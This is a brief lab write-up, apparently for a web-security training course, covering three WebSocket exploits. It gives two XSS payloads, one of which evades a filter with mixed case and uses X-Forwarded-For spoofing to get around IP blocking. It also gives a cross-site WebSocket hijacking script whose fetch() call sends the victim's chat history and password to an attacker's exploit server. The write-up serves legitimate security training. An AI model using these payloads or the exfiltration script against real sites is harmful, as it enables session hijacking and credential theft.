1. This lab uses websockets to implement a live chat feature. The chat uses HTML encoding on the messages that are sent, but does not do this on messages that are received. As a result, Burp Repeater can be used to bypass this encoding. Sending the following websocket payload causes the XSS: `{"message":"<img src=x onerror=alert()>"}`
2. This lab is the same as the previous, but it implements a XSS filter and IP blocking if that filter is tripped. The IP blocking can be bypassed using the `X-Forwarded-For` header, and the XSS filter has some holes in it. As a result, the following websocket message can be sent manually to trigger the XSS: `{"message":"<img src=x oNeRrOr=alert`1`>"}`
3. This lab's chat feature is vulnerable to cross-site websocket hijacking. Additionally, sending the `READY` command causes the server to send the entire chat history for a user. As such, the following payload on the exploit server will recover the victim's chat history, which contains his password:
```
<script>
var ws = new WebSocket("wss://acec1fda1e00aa84c0c7256800e200cc.web-security-academy.net/chat");
ws.onopen = function() {
ws.send('READY');
}
ws.onmessage = function(event) {
fetch('https://exploit-ac9e1f871e5faa78c0d325c801b300e8.web-security-academy.net/log?data=' + event.data);
}
</script>
```
